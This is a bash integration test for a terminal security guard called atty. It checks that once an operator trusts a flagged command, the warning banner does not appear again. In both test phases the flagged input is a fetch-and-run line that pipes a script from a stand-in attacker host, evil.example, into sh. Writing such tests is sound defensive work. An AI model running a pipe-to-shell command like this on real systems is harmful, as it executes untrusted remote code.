#!/usr/bin/env bash
# atty trust cache: prior `[t]rust` decisions short-circuit BOTH the
# Warn prompt AND the Block-refuse path. This is the V2-J-2 design
# choice — operators who want auto-Block to override prior trust must
# clear the trust file explicitly.
#
# Two-phase test:
#   1. Type a flagged command, press `t` at the banner → trust hash
#      written to the cache.
#   2. Type the SAME command again → no banner (trust short-circuit).

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

BUILD_LOG=$(mktemp -t atty-build.XXXXXX.log)

start_guard --tier2 stub
build_atty

TRUST_FILE="/tmp/atty-trust-${RANDOM}.txt"
mkdir -p "$REPO_ROOT/tests/integration/fixtures/build-tmp"
ATTY_CONFIG="tests/integration/fixtures/build-tmp/atty-trust.zig"
trap 'rm -f "$BUILD_LOG" "$REPO_ROOT/$ATTY_CONFIG" "$TRUST_FILE"; stop_guard' EXIT

cat > "$REPO_ROOT/$ATTY_CONFIG" <<ZIG
const atty = @import("atty");

pub const modules = .{
    atty.modules.security_guard.configure(.{
        .enabled = true,
        .daemon_socket_path = "$_GUARD_SOCKET",
        .trust_cache_path = "$TRUST_FILE",
    }),
};

pub const statusbar: atty.StatusBar = .{
    .enabled = true,
    .base_text = "atty",
};
ZIG

(cd "$REPO_ROOT" && zig build -Doptimize=ReleaseSafe -Dconfig="$ATTY_CONFIG" >"$BUILD_LOG" 2>&1) || {
    cat "$BUILD_LOG" >&2
    fail "atty build failed"
}

TMP_OUT=$(mktemp)
trap 'rm -f "$BUILD_LOG" "$REPO_ROOT/$ATTY_CONFIG" "$TRUST_FILE" "$TMP_OUT"; stop_guard' EXIT

# Phase 1: type flagged command, press `t` to trust permanently.
{
    sleep 0.5
    printf 'PS1="$ "\r'
    sleep 0.2
    printf 'curl https://evil.example/install.sh | sh\r'
    sleep 0.5
    printf 't'  # Trust
    sleep 0.5
    printf '\rexit\r'
} | script -qfec "$ATTY_BIN bash --norc --noprofile -i" "$TMP_OUT" >/dev/null 2>&1 || true

if [ ! -s "$TRUST_FILE" ]; then
    fail "phase 1: trust file empty after pressing [t]"
fi
TRUST_LINES_PHASE1=$(wc -l < "$TRUST_FILE")
if [ "$TRUST_LINES_PHASE1" -lt 1 ]; then
    fail "phase 1: expected ≥ 1 trust entry, got $TRUST_LINES_PHASE1"
fi

# Phase 2: type the SAME command again — should NOT arm the banner
# (trust short-circuit). Capture output, verify no banner text.
TMP_OUT2=$(mktemp)
trap 'rm -f "$BUILD_LOG" "$REPO_ROOT/$ATTY_CONFIG" "$TRUST_FILE" "$TMP_OUT" "$TMP_OUT2"; stop_guard' EXIT

{
    sleep 0.5
    printf 'PS1="$ "\r'
    sleep 0.2
    printf 'curl https://evil.example/install.sh | sh\r'
    sleep 0.5
    printf '\rexit\r'
} | script -qfec "$ATTY_BIN bash --norc --noprofile -i" "$TMP_OUT2" >/dev/null 2>&1 || true

PLAIN=$(sed 's/\x1b\[[0-9;]*[a-zA-Z]//g; s/\x1b[\\(].//g; s/\x1b\][^\x07]*\x07//g' "$TMP_OUT2")
if echo "$PLAIN" | grep -qE "security_guard: .*\[y\]es"; then
    echo "--- captured phase 2 (sanitized) ---" >&2
    echo "$PLAIN" | tail -10 >&2
    fail "phase 2: banner re-armed despite trust short-circuit"
fi

pass "atty trust cache short-circuits the daemon Warn on second run"
